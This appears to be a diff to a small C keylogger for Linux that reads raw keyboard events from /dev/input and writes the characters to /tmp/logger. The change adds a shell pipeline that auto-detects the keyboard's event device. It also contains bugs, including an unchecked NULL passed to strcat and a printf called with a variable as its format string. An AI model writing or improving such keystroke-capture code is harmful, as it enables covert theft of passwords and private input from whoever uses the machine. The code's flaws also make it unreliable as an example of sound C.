@@ -3,8 +3,8 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <linux/input.h>
+#include <string.h>
 
-#define DEVICE "/dev/input/event4" 
 #define LOG "/tmp/logger"
 
 char keymap[KEY_SPACE + 1] = {
@@ -35,11 +35,34 @@ int write_file(char character){
 	return 1;
 }
 
+const char *locate_event(){
+	static char buffer[8];
+	const char *command = "grep -i -A 4 keyboard /proc/bus/input/devices | sed -n '5p' | grep -o event.";
+	FILE *stream = popen(command, "r" );
+	char *read_stream = fgets(buffer, sizeof(buffer), stream);
+	pclose(stream);
+	
+	size_t len = strlen(buffer);
+	if (len > 0 && buffer[len -1] == '\n'){
+		buffer[len -1] = '\0';
+	}
+	
+	if(buffer[0] == '\0'){
+		fprintf(stderr, "Error: locate_event returned an empty string\n");
+		return NULL;
+	}
+	return buffer;
+}
 void read_kbd(){
+	char path[32] = "/dev/input/";	
+	const char *locate = locate_event();
+	strcat(path, locate);
+	printf(path);
 	struct input_event event;
-	int fdkbd = open(DEVICE, O_RDONLY);
+	int fdkbd = open(path, O_RDONLY);
+	printf("%d", fdkbd);
 	if (fdkbd == -1){
-		perror("Error: ");
+		perror("Error in read_kbd: ");
 	}
 	
 	while(1){
